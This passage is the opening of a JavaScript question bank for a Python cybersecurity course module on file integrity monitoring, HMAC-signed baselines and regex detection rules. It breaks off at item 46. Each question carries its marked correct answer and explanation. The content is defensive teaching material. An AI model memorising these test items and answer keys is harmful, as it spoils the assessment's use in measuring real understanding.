/**
 * Course 04: Python for Cybersecurity — Module 7 Question Bank
 * 200 unique MCQs (100 medium, 100 difficult; 0 easy)
 */
export const module7QuestionBank = [
  {
    "id": "q_c4_m7_001",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "medium",
    "q": "In `m07_defensive.py`, why does `snapshot(root)` convert relative file path separators with `.replace('\\\\', '/')` before storing keys in the baseline dictionary?",
    "options": [
      "To strip subdirectory hierarchy and flatten all filenames into one list",
      "Because Python `dict` keys cannot store literal backslashes",
      "So baseline keys use canonical POSIX forward slashes consistently across Windows and Linux/macOS hosts",
      "To convert binary file contents into UTF-8 text"
    ],
    "correct": 2,
    "explanation": "Normalizing backslashes to forward slashes ensures baselines generated on Windows match checks performed on Linux containers or forensic workstations without separator false positives."
  },
  {
    "id": "q_c4_m7_002",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "difficult",
    "q": "Given baseline dictionary keys $O = \\text{old.keys()}$ and rescan keys $N = \\text{new.keys()}$ where $|O| = 124$, $|N| = 126$, and $|O \\cap N| = 122$ with $3$ differing digests, what is the exact cardinality of `(Added, Removed, Modified, Unchanged)`?",
    "options": [
      "`(4, 2, 122, 3)`",
      "`(2, 4, 3, 119)`",
      "`(4, 2, 3, 119)`",
      "`(126, 124, 3, 122)`"
    ],
    "correct": 2,
    "explanation": "Added = |N \\ O| = 126 - 122 = 4; Removed = |O \\ N| = 124 - 122 = 2; Modified = 3 among the 122 shared keys; Unchanged = 122 - 3 = 119."
  },
  {
    "id": "q_c4_m7_003",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "medium",
    "q": "Which Python set-difference expression inside `compare(old, new)` identifies files deleted since the baseline was taken?",
    "options": [
      "`sorted(old.keys() - new.keys())`",
      "`sorted(new.keys() - old.keys())`",
      "`sorted(old.keys() & new.keys())`",
      "`sorted(old.keys() ^ new.keys())`"
    ],
    "correct": 0,
    "explanation": "Keys present in `old` but missing from `new` (`old.keys() - new.keys()`) denote files removed after the baseline."
  },
  {
    "id": "q_c4_m7_004",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "difficult",
    "q": "Why must security-critical File Integrity Monitoring verify full cryptographic SHA-256 digests on core binaries instead of trusting `mtime` and file `size` equality as proof of non-tampering?",
    "options": [
      "An attacker with local write privileges can craft a backdoored binary padded to the identical byte size and reset `mtime` with timestamp-stomping tools",
      "Because POSIX filesystems do not record modification timestamps on executable binaries",
      "Because `sha256` runs faster than `os.stat()` across all disks",
      "Because `mtime` only changes when a file is deleted, never when modified"
    ],
    "correct": 0,
    "explanation": "Attackers routinely preserve size and stamp `mtime` back to vendor dates (`touch -r`); only collision-resistant cryptographic hashes bind exact file content."
  },
  {
    "id": "q_c4_m7_005",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "medium",
    "q": "Why does `snapshot(root)` check `if p.is_file():` while iterating `root.rglob('*')`?",
    "options": [
      "Because `p.is_file()` sorts subdirectories alphabetically",
      "To skip symbolic links and read only JSON files",
      "Because directories yielded by `rglob('*')` cannot be opened and hashed as byte streams",
      "To delete empty temporary folders automatically"
    ],
    "correct": 2,
    "explanation": "`root.rglob('*')` yields both files and directory entries; calling `open('rb')` on a directory raises `IsADirectoryError` (`PermissionError` on Windows)."
  },
  {
    "id": "q_c4_m7_006",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "difficult",
    "q": "In `m07_defensive.py`, if `snapshot(root)` instead keyed paths with `str(p.resolve())`, which real operational problem occurs when verifying an emergency backup image mounted at `/mnt/forensics/`?",
    "options": [
      "Every single file looks simultaneously Removed from `/var/www/` and Added under `/mnt/forensics/`, obscuring the 1 modified webshell",
      "`sha256(p)` throws `UnicodeDecodeError` on mount paths",
      "Absolute paths produce identical keys regardless of mount location",
      "`hmac.compare_digest` refuses keys longer than 64 characters"
    ],
    "correct": 0,
    "explanation": "Absolute root prefixes couple baselines to one mount point; relative POSIX keys ensure structural identity across restored or mounted images."
  },
  {
    "id": "q_c4_m7_007",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "medium",
    "q": "Which production enterprise security tools perform automated File Integrity Monitoring workflows similar in principle to Course 04 Module 7?",
    "options": [
      "`Black` and `Ruff` formatting engines",
      "`Wireshark` and `tcpdump` only",
      "`AIDE`, `OSSEC`, and `Wazuh`",
      "`venv` and `pip-audit`"
    ],
    "correct": 2,
    "explanation": "`AIDE`, `OSSEC`, and `Wazuh` are industry-standard FIM implementations taught alongside PCI DSS integrity monitoring."
  },
  {
    "id": "q_c4_m7_008",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "difficult",
    "q": "Why does `sha256(path)` read chunks with `iter(lambda: fh.read(65536), b'')` instead of calling `path.read_bytes()` during a nightly system-wide FIM sweep?",
    "options": [
      "`hashlib.sha256` rejects buffers larger than 64 KiB",
      "`read_bytes()` strips trailing null bytes automatically, corrupting digests",
      "Reading fixed 64 KiB chunks keeps process RAM constant O(1) even when encountering multi-gigabyte VM images or database files",
      "64 KiB chunking skips unchanged filesystem blocks automatically"
    ],
    "correct": 2,
    "explanation": "Streaming fixed chunks avoids out-of-memory crashes across multi-gigabyte disk artifacts while producing bit-for-bit identical digests."
  },
  {
    "id": "q_c4_m7_009",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "medium",
    "q": "In `m07_defensive.py` execution output `changes: {'added': ['cron.evil'], 'removed': ['hosts'], 'modified': ['sshd_config']}`, which condition placed `sshd_config` into `'modified'`?",
    "options": [
      "`'sshd_config'` existed in both `old` and `new` key sets, with `old['sshd_config'] != new['sshd_config']`",
      "`'sshd_config'` appeared only in `new.keys()`",
      "`'sshd_config'` failed HMAC verification inside `baseline.json`",
      "`'sshd_config'` matched rule `RK-003`"
    ],
    "correct": 0,
    "explanation": "Keys present in the intersection `old.keys() & new.keys()` whose SHA-256 digests differ are classified as `modified`."
  },
  {
    "id": "q_c4_m7_010",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "difficult",
    "q": "When adding `fnmatch` path exclusions in Practical P1 (`--exclude '*.log'`), why should you filter paths BEFORE computing `sha256(p)` during `snapshot()`?",
    "options": [
      "To avoid wasting disk I/O and CPU hashing multi-gigabyte excluded log files while keeping baseline diffs noise-free",
      "Because `hashlib.sha256` hangs on `.log` extensions",
      "Because `fnmatch` matches digest hex strings rather than file paths",
      "Because `dict` keys cannot contain dots"
    ],
    "correct": 0,
    "explanation": "Evaluating exclusion patterns before reading file bytes avoids hashing huge volatile logs during every scheduled scan."
  },
  {
    "id": "q_c4_m7_011",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "medium",
    "q": "Which standard-library Python module supports Unix shell-style wildcard matching (such as `'*.tmp'` or `'cache/*'`) for FIM exclusion filters in Practical P1?",
    "options": [
      "`fnmatch`",
      "`hmac`",
      "`shlex`",
      "`html`"
    ],
    "correct": 0,
    "explanation": "`fnmatch.fnmatch()` provides simple glob pattern matching on normalized relative path strings."
  },
  {
    "id": "q_c4_m7_012",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "difficult",
    "q": "Suppose an attacker replaces `/usr/sbin/sshd` with a symlink pointing to `/tmp/evil_sshd`. Why must a hardened FIM script inspect `p.is_symlink()` explicitly in addition to `p.is_file()`?",
    "options": [
      "`Path.is_file()` follows symlinks to regular targets by default, potentially obscuring unexpected symlink swaps without recording link target changes",
      "`Path.is_file()` always returns `False` for symlinks on POSIX systems",
      "Calling `p.is_symlink()` automatically deletes malicious symlinks",
      "`rglob('*')` never yields symlinks"
    ],
    "correct": 0,
    "explanation": "Checking `is_symlink()` lets FIM record `readlink()` targets explicitly or flag unexpected symlink redirection."
  },
  {
    "id": "q_c4_m7_013",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "medium",
    "q": "Why does `snapshot()` wrap `root.rglob('*')` in `sorted(...)`?",
    "options": [
      "Python dictionaries reject unsorted string insertions",
      "`rglob('*')` raises `TypeError` unless wrapped in `sorted()`",
      "Filesystem directory iteration order varies by OS and inode layout; sorting makes output deterministic",
      "`sorted()` prevents `PermissionError` on protected directories"
    ],
    "correct": 2,
    "explanation": "Directory entry traversal order from the OS filesystem is arbitrary; sorting produces reproducible displays and diffs."
  },
  {
    "id": "q_c4_m7_014",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "difficult",
    "q": "If `snapshot(root)` checks `1,000` files cleanly (`|O| = |N| = 1,000`), adds `0` new files, deletes `0`, and modifies `0` files, which exit code should Practical P1's `check` subcommand return to cron or Task Scheduler?",
    "options": [
      "`0` (analysed cleanly, zero unauthorized changes)",
      "`1` (baseline check executed)",
      "`2` (no alerts found)",
      "`-1` (empty diff)"
    ],
    "correct": 0,
    "explanation": "Practical P1 uses `0` for no changes, `1` when changes are detected, and `2` on invalid signature or operational error."
  },
  {
    "id": "q_c4_m7_015",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "medium",
    "q": "What regulatory compliance standard explicitly requires File Integrity Monitoring on critical system binaries and configuration files?",
    "options": [
      "HTML5 Web Storage Specification",
      "PEP 8 Python Formatting Guide",
      "PCI DSS (Payment Card Industry Data Security Standard)",
      "RFC 791 IPv4 Addressing Standard"
    ],
    "correct": 2,
    "explanation": "PCI DSS mandates FIM controls to alert administrators promptly on unauthorized modification of critical payment system files."
  },
  {
    "id": "q_c4_m7_016",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "difficult",
    "q": "Why does an optimization comparing cached `(size, mtime_ns)` before hashing NOT bypass detection if `file` content changes AND its `mtime` also changed legitimately?",
    "options": [
      "Size mismatches trigger HMAC key rotation automatically",
      "Any size or mtime mismatch invalidates the cache hit and triggers full SHA-256 recomputation",
      "Mtime changes automatically append the file to `removed`",
      "Because `compare()` ignores digests whenever `size` matches"
    ],
    "correct": 1,
    "explanation": "Under benign edits, `mtime_ns` updates cleanly, prompting SHA-256 verification while skipping re-reads only on static unmodified files."
  },
  {
    "id": "q_c4_m7_017",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "medium",
    "q": "Which real-time Linux kernel subsystem lets continuous FIM daemons receive immediate filesystem change notifications rather than waiting solely for hourly directory scans?",
    "options": [
      "`unittest.TestCase`",
      "`urllib.request`",
      "`inotify` (exposed in Python via packages like `watchdog`)",
      "`csv.DictReader`"
    ],
    "correct": 2,
    "explanation": "Linux `inotify` (and Windows directory change APIs via `watchdog`) deliver immediate kernel filesystem events alongside periodic sweep baselines."
  },
  {
    "id": "q_c4_m7_018",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "difficult",
    "q": "Look at `m07_defensive.py`: after inserting `cron.evil`, deleting `hosts`, and modifying `sshd_config`, what was `compare(base, now)['removed']`?",
    "options": [
      "`['hosts']`",
      "`['cron.evil']`",
      "`['sshd_config']`",
      "`[]`"
    ],
    "correct": 0,
    "explanation": "`hosts` was present in `base` and unlinked before `now = snapshot(root)`, appearing solely in `removed`."
  },
  {
    "id": "q_c4_m7_019",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "medium",
    "q": "If a file is copied unchanged onto a new path inside the monitored directory while the original path remains, how does `compare(old, new)` classify the duplicate path?",
    "options": [
      "As `'removed'` until `accept` runs",
      "As `'unchanged'`, because its hash already exists under another filename",
      "As `'modified'`, because two keys share one hash",
      "As `'added'`, because `compare` compares key paths (`new.keys() - old.keys()`), even though the SHA-256 value matches an existing path"
    ],
    "correct": 3,
    "explanation": "FIM tracks integrity per normalized path key; unexpected new file creation in monitored directories—even duplicates—appears in `'added'`."
  },
  {
    "id": "q_c4_m7_020",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "difficult",
    "q": "When `old = {'a': 'h1', 'b': 'h2'}` and `new = {'a': 'h1', 'b': 'h9', 'c': 'h3'}`, which set expressions yield `'added'`, `'removed'`, and `'modified'`?",
    "options": [
      "`added=['c']`, `removed=[]`, `modified=['b']`",
      "`added=['c']`, `removed=['b']`, `modified=[]`",
      "`added=['b', 'c']`, `removed=[]`, `modified=[]`",
      "`added=[]`, `removed=['c']`, `modified=['a', 'b']`"
    ],
    "correct": 0,
    "explanation": "`c` is only in `new` (added), no key in `old` is missing from `new` (removed empty), and `b` is in both with `'h2' != 'h9'` (modified)."
  },
  {
    "id": "q_c4_m7_021",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "medium",
    "q": "In Case Study C04-M07-CS2 (Tamarind Travels), how did an attacker evade FIM detection for an entire month after implanting PHP webshells?",
    "options": [
      "By crashing `sha256()` using oversized empty files",
      "By flooding the FIM email box with 50,000 alerts",
      "Because the baseline lived writable inside the webroot, the attacker modified the PHP files and regenerated the baseline so future comparisons reported all clear",
      "By changing Python from CPython 3.12 to 3.14"
    ],
    "correct": 2,
    "explanation": "Storing writable baseline truth on the compromised web server under the web user allowed the attacker to overwrite clean hashes with backdoored ones."
  },
  {
    "id": "q_c4_m7_022",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "difficult",
    "q": "In `sign(data, key)` inside `m07_defensive.py`, why is `json.dumps(data, sort_keys=True)` mandatory before passing UTF-8 bytes into `hmac.new(key, blob, hashlib.sha256)`?",
    "options": [
      "Any difference in dictionary key insertion order produces different JSON bytes and a mismatched HMAC tag even when Python dicts hold identical keys and values",
      "`json.dumps()` refuses to encode nested dicts unless `sort_keys=True` is passed",
      "`sort_keys=True` strips trailing whitespace inside file paths",
      "`hmac.new()` hashes keys only and ignores dictionary values unless sorted"
    ],
    "correct": 0,
    "explanation": "Cryptographic MACs operate on exact byte sequences; canonical `sort_keys=True` guarantees identical byte serialization across reloads and hosts."
  },
  {
    "id": "q_c4_m7_023",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "medium",
    "q": "In `m07_defensive.py`, why does tampering with a single SHA-256 string inside `baseline.json` (`'sshd_config': '0'*64`) print `tampered baseline valid: False`?",
    "options": [
      "`json.loads()` refuses strings containing repeated zeros",
      "The recomputed HMAC over modified `raw['files']` no longer equals `raw['sig']` under `hmac.compare_digest`",
      "`snapshot()` deletes modified keys automatically from `baseline.json`",
      "`compare()` requires signatures to start with `'f'`"
    ],
    "correct": 1,
    "explanation": "Without possessing the secret `key`, an adversary altering any field inside `'files'` cannot forge the matching 256-bit HMAC tag."
  },
  {
    "id": "q_c4_m7_024",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "difficult",
    "q": "Suppose a script stores BOTH `baseline.json` AND the HMAC signing key file `fim.key` inside `/var/www/html/security/` readable/writable by the web app user. What security guarantee remains if the web app has an RCE flaw?",
    "options": [
      "Full guarantee as long as `sort_keys=True` is enabled",
      "Full guarantee because HMAC uses SHA-256 rather than MD5",
      "Partial guarantee because `hmac.compare_digest` rejects keys stored in `/var/www/`",
      "Zero guarantee against active attackers: any code running as the web user reads `fim.key`, alters PHP files, and mints a valid HMAC over forged hashes"
    ],
    "correct": 3,
    "explanation": "Cryptographic signatures fail closed against attackers ONLY if the attacker cannot access the signing key (`off-host key storage`)."
  },
  {
    "id": "q_c4_m7_025",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "medium",
    "q": "Why must FIM baseline verification use `hmac.compare_digest(expected, actual)` rather than standard Python `expected == actual`?",
    "options": [
      "`hmac.compare_digest` parses JSON directly without `json.loads()`",
      "`==` returns `False` on lowercase hexadecimal strings",
      "Constant-time comparison eliminates byte-by-byte short-circuit timing leaks across verified tags",
      "`==` ignores mismatched string lengths"
    ],
    "correct": 2,
    "explanation": "`==` exits early at the first mismatching byte, exposing timing side channels; `compare_digest` checks the full length uniformly."
  },
  {
    "id": "q_c4_m7_026",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "difficult",
    "q": "What happens if an operational FIM check opens `baseline.json` with `validate` failing (`tampered baseline valid: False`), yet the script ignores the failure and prints `'0 file changes'`?",
    "options": [
      "It automatically triggers baseline rotation via `accept`",
      "It satisfies fail-closed behavior by refusing to crash",
      "It violates fail-closed design: an attacker who corrupts or swaps the baseline tricks automation into reading 'clean system' instead of paging on integrity failure",
      "Nothing adverse happens because OS backups restore `baseline.json`"
    ],
    "correct": 2,
    "explanation": "Signature verification failure is a critical security error requiring immediate termination with non-zero error status (`exit 2`), never silent continuation."
  },
  {
    "id": "q_c4_m7_027",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "medium",
    "q": "Why does an unkeyed SHA-256 digest written in `baseline.sha256` fail to defend against an attacker with filesystem write access to `baseline.sha256`?",
    "options": [
      "SHA-256 truncates filenames longer than 32 characters",
      "SHA-256 collisions can be generated in under 10 milliseconds on laptops",
      "Anyone can run `sha256` over forged files and overwrite `baseline.sha256` because no secret key is required",
      "Unkeyed SHA-256 does not protect JSON objects"
    ],
    "correct": 2,
    "explanation": "Plain hashes detect accidental corruption (`Integrity`), whereas keyed HMAC prevents unauthorized forgery (`Authenticity`)—provided the key stays secret."
  },
  {
    "id": "q_c4_m7_028",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "difficult",
    "q": "Notice that `json.dumps(data, sort_keys=True)` produces spaces after colons/commas by default (`separators=(', ', ': ')`). When deploying across Python and external Go/Node verifiers, why should canonical signers avoid subtle formatting assumptions or document exact JSON encoding rules?",
    "options": [
      "Because different serializers emit compact vs. spaced separators (`', '` vs. `','`), changing every byte after whitespace and invalidating cross-language HMAC verification",
      "Because Go refuses UTF-8 JSON strings",
      "Because Python `sort_keys=True` sorts integers numerically rather than alphabetically",
      "Because Node.js automatically converts SHA-256 hex to Base64"
    ],
    "correct": 0,
    "explanation": "Whitespace differences between serializers (`separators=(',', ':')` vs default) alter raw HMAC input bytes; signing raw canonical bytes or explicit `separators=(',', ':')` guarantees interoperability."
  },
  {
    "id": "q_c4_m7_029",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "medium",
    "q": "In Practical P1 (`init` / `check` / `accept`), when should an administrator run the `accept` command?",
    "options": [
      "Whenever an unknown file like `cron.evil` appears so alerts stop firing",
      "Automatically inside cron every 5 minutes right before `check` runs",
      "Only after verifying authorized software patching or configuration maintenance to re-sign the updated clean baseline using the operator HMAC key",
      "Without a key file so automation stays zero-touch"
    ],
    "correct": 2,
    "explanation": "Running `accept` after verified maintenance updates the authoritative baseline safely; automating `accept` unconditionally blinds FIM completely."
  },
  {
    "id": "q_c4_m7_030",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "difficult",
    "q": "Compare two architectures when the webserver root directory is monitored: (1) local `baseline.json` signed with a key held only on a remote verification server vs. (2) local key held in `/etc/fim/key` readable only by `root`. What threat differentiates (1) from (2)?",
    "options": [
      "If the attacker escalates privileges to `root` on the webserver, architecture (2) exposes `/etc/fim/key` to local baseline forgery, whereas off-host verification in (1) stays intact",
      "Architecture (2) fails to detect webshells created by `www-data`",
      "Architecture (1) cannot use SHA-256 over TLS",
      "Both architectures collapse instantly upon any PHP injection bug"
    ],
    "correct": 0,
    "explanation": "Local root-only keys protect against `www-data` compromise (better than Tamarind Travels), while true off-host verification survives even full host `root` takeover."
  },
  {
    "id": "q_c4_m7_031",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "medium",
    "q": "In `m07_defensive.py`, how is the 256-bit HMAC key generated for the synthetic verification demonstration?",
    "options": [
      "`random.randint(0, 255)`",
      "`secrets.token_bytes(32)`",
      "`str(time.time()).encode()`",
      "`hashlib.md5(b'key').digest()`"
    ],
    "correct": 1,
    "explanation": "`secrets.token_bytes(32)` pulls 256 cryptographically random bits from the operating system CSPRNG."
  },
  {
    "id": "q_c4_m7_032",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "difficult",
    "q": "Suppose someone saves `baseline.json` and calculates HMAC over `baseline.json` *text*, then later pretty-prints the file with `indent=2`. What happens if they verify HMAC against raw file bytes vs. verifying `sign(raw['files'], key)` on the nested dictionary?",
    "options": [
      "Raw file-byte MAC succeeds even after changing `sshd_config`",
      "Both fail because `json.loads` removes keys during pretty-printing",
      "Raw file-byte MAC verification fails on pretty-printing whitespace changes, whereas `sign(raw['files'], key)` remains invariant across envelope formatting changes",
      "Neither approach works with `hmac.compare_digest`"
    ],
    "correct": 2,
    "explanation": "Envelope design (`{'files': ..., 'sig': sign(files, key)}`) separates canonical payload serialization from outer transport indentation."
  },
  {
    "id": "q_c4_m7_033",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "medium",
    "q": "Besides off-host baseline storage and central HMAC keys, what operational safeguard did Tamarind Travels lack that would alert immediately upon unauthorized baseline tampering?",
    "options": [
      "Disabling logs on `www-data`",
      "Switching from JSON to `pickle` files",
      "Running `check` only once per quarter",
      "Alerting whenever the baseline manifest itself changes outside an approved change-control window"
    ],
    "correct": 3,
    "explanation": "Tracking and alerting on unexpected baseline modifications exposes attempts to silence the integrity monitor itself."
  },
  {
    "id": "q_c4_m7_034",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "difficult",
    "q": "In `hmac.compare_digest(sign(raw['files'], key), raw['sig'])`, what exception occurs if an attacker edits `raw['sig']` in `baseline.json` from a string into `null` or `12345` before running `check`?",
    "options": [
      "`json.loads()` refuses JSON numbers automatically",
      "`hmac.compare_digest` converts `12345` to `'12345'` silently and returns `True`",
      "`TypeError`, so `check` must validate `isinstance(raw.get('sig'), str)` and `isinstance(raw.get('files'), dict)` explicitly (catching corrupt schema cleanly with exit code 2)",
      "Python exits cleanly with code `0`"
    ],
    "correct": 2,
    "explanation": "`hmac.compare_digest` requires matching types (`str`/`bytes`) and raises `TypeError` on ints or `None`; defensive code validates envelope types and fails closed with exit `2`."
  },
  {
    "id": "q_c4_m7_035",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "medium",
    "q": "What does `raw['sig']` hold in the `baseline.json` envelope written by `m07_defensive.py`?",
    "options": [
      "The plaintext path to `hosts`",
      "An encrypted AES-256 copy of `sshd_config`",
      "A 64-character lowercase hexadecimal HMAC-SHA256 authentication tag computed over canonical JSON bytes of `base`",
      "The 32-byte secret HMAC key itself"
    ],
    "correct": 2,
    "explanation": "`hmac.new(...).hexdigest()` returns 64 hex digits (`256 bits`); it never embeds the secret key inside the signed file."
  },
  {
    "id": "q_c4_m7_036",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "difficult",
    "q": "If a remote host pushes its `snapshot()` JSON envelope (`files` + metadata) to a central collector where ONLY the central collector holds `key`, why can a compromised endpoint still falsify snapshots BEFORE sending them unless another safeguard exists?",
    "options": [
      "A compromised kernel or endpoint agent could lie about disk reads locally, which is why off-host forensic snapshots, kernel audit telemetry, and dead-man checks layer together",
      "Because `json.dumps()` modifies SHA-256 digests during TCP transmission",
      "Because TLS exposes HMAC keys in plaintext HTTP headers",
      "It cannot: sending JSON remotely makes endpoint disk lying mathematically impossible"
    ],
    "correct": 0,
    "explanation": "Off-host baseline storage stops rewriting history; pairing FIM with read-only host mounts/snapshots or kernel audit streams addresses runtime agent spoofing."
  },
  {
    "id": "q_c4_m7_037",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "medium",
    "q": "Why should `--key-file` permissions in POSIX environments follow `0400` or `0600` (`read-only`/`owner-only`) rather than world-readable `0644`?",
    "options": [
      "Any unprivileged local account able to read the HMAC key on `0644` could forge indistinguishable baseline signatures",
      "Python's `Path.read_bytes()` raises `PermissionError` on `0644` files",
      "`hmac.new()` rejects keys readable by group or other",
      "`0644` converts binary keys into UTF-16"
    ],
    "correct": 0,
    "explanation": "Worldwide read permissions expose symmetric MAC keys to every local user or compromised web service on the system."
  },
  {
    "id": "q_c4_m7_038",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "difficult",
    "q": "When `baseline.json` includes nested dict metadata (`{'sshd_config': {'sha256': ..., 'size': 418, 'mtime': ...}}`) in Practical P1, does `json.dumps(data, sort_keys=True)` sort ONLY top-level keys or ALL nested dict keys recursively?",
    "options": [
      "Only keys longer than 8 characters",
      "Only the top-level dictionary keys; nested metadata keys stay insertion-ordered",
      "Recursively across every dictionary at every nesting level inside `data`",
      "It raises `ValueError` unless `recursive=True` is passed"
    ],
    "correct": 2,
    "explanation": "Python's `json.dumps(..., sort_keys=True)` sorts dictionary keys recursively at all nesting depths automatically."
  },
  {
    "id": "q_c4_m7_039",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "medium",
    "q": "Why shouldn't a developer store the hardcoded HMAC key string directly as a global constant (`SECRET = b'redkross123'`) inside `fim.py`?",
    "options": [
      "Anyone with read access to `fim.py` (including Git repos or compromised servers executing `python fim.py`) trivially extracts the hardcoded secret and forges baselines",
      "`hmac.new()` prohibits ASCII secret bytes",
      "Hardcoded keys expire automatically after 30 days",
      "`argparse` blocks passing hardcoded byte literals"
    ],
    "correct": 0,
    "explanation": "Source code is frequently readable on hosts and committed to repositories; keys must load dynamically from protected key files or secret managers."
  },
  {
    "id": "q_c4_m7_040",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "difficult",
    "q": "Examine Tamarind Travels (`C04-M07-CS2`) again: what distinguishes accidental bit-rot corruption on disk from an active web server intrusion?",
    "options": [
      "Bit rot alters disk files leaving unsigned hashes mismatched, whereas an active intruder controlling the webroot updates both files and any locally writable unsigned/self-keyed baseline",
      "Bit rot only changes timestamps while attackers only alter hashes",
      "Intruders never touch PHP files inside `/var/www/`",
      "Bit rot produces exit code `2` automatically"
    ],
    "correct": 0,
    "explanation": "Security engineering must model an intelligent adversary who actively disables or forges defenses residing within their compromised trust zone."
  },
  {
    "id": "q_c4_m7_041",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "medium",
    "q": "What is the primary architectural advantage of defining detection signatures (`id`, `title`, `re`/`pattern`, `threshold`, `severity`) as declarative JSON/YAML data rather than `if/elif` chains inside Python code?",
    "options": [
      "Analysts can add, tune, or share detection rules across tools without editing or redeploying the Python engine code",
      "Declarative JSON eliminates the need for regex validation",
      "JSON rules execute 100x faster than compiled Python bytecode",
      "Declarative rules skip threshold counting automatically"
    ],
    "correct": 0,
    "explanation": "Decoupling rules from execution logic mirrors enterprise Sigma and Wazuh workflows—allowing rapid rule iteration without touching engine internals."
  },
  {
    "id": "q_c4_m7_042",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "difficult",
    "q": "In `m07_defensive.py`, rule `RK-002` reads `r'sudo: .*authentication failure.*user=(?P<user>\\S+)'` (`threshold=3`). Why does the engine build `key = (rule['id'], entity)` rather than keying `counts` solely on `rule['id']`?",
    "options": [
      "So that `RK-001` and `RK-003` share one cumulative suppression clock",
      "Because Python dictionaries forbid string keys",
      "Without separating by `entity`, 1 `sudo` typo by `alice`, 1 by `bob`, and 1 by `chen` sum to 3 under `'RK-002'`, firing a false alert though no single user hit threshold",
      "Because `rule['id']` is overwritten on every loop iteration"
    ],
    "correct": 2,
    "explanation": "Composite `(rule_id, entity)` keying isolates per-actor and per-rule counts independently."
  },
  {
    "id": "q_c4_m7_043",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "medium",
    "q": "In `RK-001` (`r'Accepted \\S+ for root from (?P<ip>\\S+)'`), what does `(?P<ip>\\S+)` provide when `m = rule['re'].search(msg)` succeeds?",
    "options": [
      "Suppression of `root` events for 10 minutes",
      "Automatic CIDR subnet validation via `ipaddress`",
      "Case-insensitive matching across hostnames",
      "A named capture group accessible via `m.groupdict()['ip']` extracting the source IP entity uniformly without positional index guesswork"
    ],
    "correct": 3,
    "explanation": "Named capture groups let uniform rule engines inspect `m.groupdict().get('ip') or m.groupdict().get('user')` across heterogeneous patterns."
  },
  {
    "id": "q_c4_m7_044",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "difficult",
    "q": "Suppose an author copies Python raw string `r'useradd\\[\\d+\\]:'` straight into an external JSON rules file (`rules.json`) as `'pattern': 'useradd\\[\\d+\\]:'`. What happens during `json.loads()`?",
    "options": [
      "`json.loads()` parses single backslashes identically to Python `r'...'` raw strings",
      "`json.loads()` raises `json.JSONDecodeError` (invalid `\\[` / `\\d` escapes) because JSON requires double-escaped backslashes (`'useradd\\\\[\\\\d+\\\\]:'`)",
      "The regex matches literal brackets automatically without error",
      "Python raises `re.error` only after the first matching log line arrives"
    ],
    "correct": 1,
    "explanation": "Unlike Python `r'...'` raw literals, JSON has no raw string syntax; regex backslashes inside `.json` rule files must be doubled (`\\\\`)."
  },
  {
    "id": "q_c4_m7_045",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "medium",
    "q": "Why does Practical P2 require compiling all regex patterns from `rules.json` at engine startup rather than compiling each rule inside the per-line log loop?",
    "options": [
      "Precompiling validates broken patterns immediately at launch (fail-closed startup error) and avoids costly repeated regex compilation on every log line",
      "`re.search()` raises `SyntaxError` unless given a precompiled `Pattern` object",
      "`json.load()` deletes regex strings after reading",
      "Precompiling clears old suppression timers automatically"
    ],
    "correct": 0,
    "explanation": "Fail-fast startup validation prevents discovering a broken syntax rule weeks later only when logs arrive, while precompiling boosts throughput."
  },
  {
    "id": "q_c4_m7_046",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "difficult",
